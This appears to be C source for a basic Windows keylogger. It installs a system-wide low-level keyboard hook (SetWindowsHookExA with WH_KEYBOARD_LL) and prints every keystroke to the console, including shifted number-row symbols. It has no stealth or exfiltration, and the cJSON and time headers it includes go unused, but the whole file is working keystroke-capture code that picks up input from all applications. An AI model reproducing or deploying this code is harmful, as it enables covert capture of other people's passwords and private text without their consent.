#include <windows.h>
#include <stdio.h>
#include "cJSON.h"
#include <time.h>

//Keys Log
LRESULT hook_proc(int code, WPARAM wParam, LPARAM lParam) {
    KBDLLHOOKSTRUCT *keypointer = (KBDLLHOOKSTRUCT *) lParam;
    if (wParam == WM_KEYDOWN) {
        switch (keypointer->vkCode) {
            case VK_SPACE:
                printf("SPACE ");
                break;
            case VK_BACK:
                printf("BACKSPACE ");
                break;
            case VK_RETURN:
                printf("ENTER ");
                break;
            case 0x31:
                if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                    printf("! ");
                } else {
                    printf("1 ");
                };
                break;
            case 0x32:
                if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                    printf("@ ");
                } else {
                    printf("2 ");
                };
                break;
            case 0x33:
                if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                    printf("# ");
                } else {
                    printf("3 ");
                };
                break;
            case 0x34:
                if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                    printf("$ ");
                } else {
                    printf("4 ");
                };
                break;
            case 0x35:
                if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                    printf("%% ");
                } else {
                    printf("5 ");
                };
                break;
            case 0x36:
                if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                    printf("^ ");
                } else {
                    printf("6 ");
                };
                break;
            case 0x37:
                if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                    printf("& ");
                } else {
                    printf("7 ");
                };
                break;
            case 0x38:
                if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                    printf("* ");
                } else {
                    printf("8 ");
                };
                break;
            default:
                printf("%c ", keypointer->vkCode);
                break;
        }
    }
    return CallNextHookEx(NULL, code, wParam, lParam);
}

int main() {
    HHOOK keyboardhook = SetWindowsHookExA(WH_KEYBOARD_LL, hook_proc, NULL, 0);
    if (keyboardhook == NULL) {
        printf("keylog failed\n");
    } else {
        printf("keylog started\n");
    }

    MSG msg;
    while( (GetMessage( &msg, NULL, 0, 0 )) != 0)
    { 
        TranslateMessage(&msg); 
        DispatchMessage(&msg); 
    } 
}